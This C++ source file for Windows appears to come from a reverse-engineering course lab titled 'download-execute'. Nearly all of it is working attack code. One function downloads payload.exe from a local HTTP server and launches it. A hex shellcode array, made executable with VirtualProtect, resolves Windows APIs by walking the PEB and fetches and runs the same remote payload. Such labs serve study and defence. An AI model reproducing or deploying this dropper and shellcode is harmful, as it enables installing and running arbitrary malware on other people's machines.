// Task #1: download-execute
// HTTP-server:  $ python -m http.server 2291
#include <urlmon.h>

#include <windows.h>
#include <iostream>

#pragma comment(lib, "urlmon.lib")

using namespace std;


int RunDemo()
{
	// Initialize local vars
	STARTUPINFOA stStartupInfo = { 0 };
	PROCESS_INFORMATION stProcessInfo = { 0 };

	//string szUrl = "https://raw.githubusercontent.com/dedkuzmich/reverse2024/main/lab2/payload/payload.exe";
	string szUrl = "http://192.168.1.10:2291/payload.exe";
	string szFilename = "payload.exe";

	// Download payload
	URLDownloadToFileA(NULL, szUrl.c_str(), szFilename.c_str(), 0, NULL);

	// Run payload
	CreateProcessA(NULL, (LPSTR)szFilename.c_str(), NULL, NULL, FALSE,
		0, NULL, NULL, (STARTUPINFOA*)&stStartupInfo, &stProcessInfo);

	return 0;
}


int RunShellcode()
{
	char shellcode[] = "\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x38\x01\x00\x48\x8d\x0d\xc3\x02\x00\x00\xe8\x0b\x01\x00\x00\x48\x89\x45\xf0\x48\x8d\x0d\xc0\x02\x00\x00\xe8\xfb\x00\x00\x00\x48\x89\x45\xe8\x48\x8d\x0d\x96\x02\x00\x00\xff\x55\xf0\x48\x89\x45\xf8\x48\x8b\x4d\xf8\x48\x8d\x15\xad\x02\x00\x00\xff\x55\xe8\x48\x89\x45\xe0\x48\x8d\x0d\xae\x02\x00\x00\xff\x55\xf0\x48\x89\x45\xd8\x48\x8b\x4d\xd8\x48\x8d\x15\xa7\x02\x00\x00\xff\x55\xe8\x48\x89\x45\xd0\x48\x8d\x8d\x68\xff\xff\xff\xba\x68\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\x9f\x01\x00\x00\x48\x8d\x8d\x50\xff\xff\xff\xba\x18\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\x88\x01\x00\x00\xb9\x00\x00\x00\x00\x48\x8d\x15\x79\x02\x00\x00\x4c\x8d\x05\x97\x02\x00\x00\x41\xb9\x00\x00\x00\x00\x48\xc7\x44\x24\x20\x00\x00\x00\x00\xff\x55\xd0\x4c\x8d\xa5\x68\xff\xff\xff\x4c\x8d\xad\x50\xff\xff\xff\xb9\x00\x00\x00\x00\x48\x8d\x15\x6b\x02\x00\x00\x41\xb8\x00\x00\x00\x00\x41\xb9\x00\x00\x00\x00\x48\xc7\x44\x24\x20\x00\x00\x00\x00\x48\xc7\x44\x24\x28\x00\x00\x00\x00\x48\xc7\x44\x24\x30\x00\x00\x00\x00\x48\xc7\x44\x24\x38\x00\x00\x00\x00\x4c\x89\x64\x24\x40\x4c\x89\x6c\x24\x48\xff\x55\xe0\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\xa8\x00\x00\x48\x89\x4d\xf8\x48\x8b\x4d\xf8\xe8\x2a\x01\x00\x00\x48\x89\x45\xf0\x65\x48\x8b\x1c\x25\x60\x00\x00\x00\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x48\x89\x5d\xe8\x4c\x8b\x65\xe8\x41\x8b\x5c\x24\x3c\x4c\x01\xe3\x8b\x9b\x88\x00\x00\x00\x4c\x01\xe3\xb9\x00\x00\x00\x00\x8b\x4b\x10\x48\x89\x4d\xe0\x8b\x4b\x18\x48\x89\x4d\xd8\x8b\x4b\x1c\x4c\x01\xe1\x48\x89\x4d\xd0\x8b\x4b\x20\x4c\x01\xe1\x48\x89\x4d\xc8\x8b\x4b\x24\x4c\x01\xe1\x48\x89\x4d\xc0\x41\xbf\x00\x00\x00\x00\x4c\x8b\x65\xc8\x43\x8b\x1c\xbc\x48\x03\x5d\xe8\x48\x89\x5d\xb8\x4c\x89\x7d\xb0\x48\x8b\x4d\xb8\xe8\x9e\x00\x00\x00\x48\x3b\x45\xf0\x74\x09\x49\xff\xc7\x4c\x3b\x7d\xd8\x75\xd4\xb8\x00\x00\x00\x00\x4c\x8b\x65\xc0\x4c\x8b\x7d\xb0\x66\x43\x8b\x04\x7c\x48\x03\x45\xe0\x48\x89\x45\xa8\xb8\x00\x00\x00\x00\x4c\x8b\x65\xd0\x4c\x8b\x7d\xa8\x4c\x2b\x7d\xe0\x43\x8b\x04\xbc\x48\x03\x45\xe8\x48\x89\x45\xa0\x48\x8b\x45\xa0\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x68\x00\x00\x48\x89\x4d\xf8\x48\x89\x55\xf0\x4c\x89\x45\xe8\x4c\x8b\x65\xf8\x4c\x8b\x6d\xf0\x4c\x8b\x75\xe8\x41\xbf\x00\x00\x00\x00\x4f\x89\x34\x3c\x49\x83\xc7\x08\x4d\x39\xef\x75\xf3\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x58\x00\x00\x48\x89\x4d\xf8\x4c\x8b\x5d\xf8\x41\xbc\x00\x00\x00\x00\x41\xbf\x00\x00\x00\x00\xbb\x00\x00\x00\x00\x43\x8a\x1c\x3b\x48\x83\xfb\x00\x74\x0c\x41\xc1\xcc\x0d\x49\x01\xdc\x49\xff\xc7\xeb\xe5\x4c\x89\xe0\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x00\x00\xf5\xff\xff\xff\xff\xff\xff\xff\x0a\x00\x70\x61\x75\x73\x65\x00\x6b\x65\x72\x6e\x65\x6c\x33\x32\x2e\x64\x6c\x6c\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x41\x00\x75\x72\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c\x00\x55\x52\x4c\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x54\x6f\x46\x69\x6c\x65\x41\x00\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x30\x3a\x32\x32\x39\x31\x2f\x70\x61\x79\x6c\x6f\x61\x64\x2e\x65\x78\x65\x00\x70\x61\x79\x6c\x6f\x61\x64\x2e\x65\x78\x65\x00";

	cout << "Shellcode size: " << sizeof(shellcode) << endl;
	DWORD flOldProtect;
	BOOL ret = VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &flOldProtect);
	if (!ret)
	{
		cout << "[-] VirtualProtect is enabled" << endl;
		return 1;
	}
	(*(void (*)()) & shellcode)();
	return 0;
}


int main(int argc, char* argv[])
{
	// RunDemo();
	RunShellcode();

	system("pause");
	return 0;
}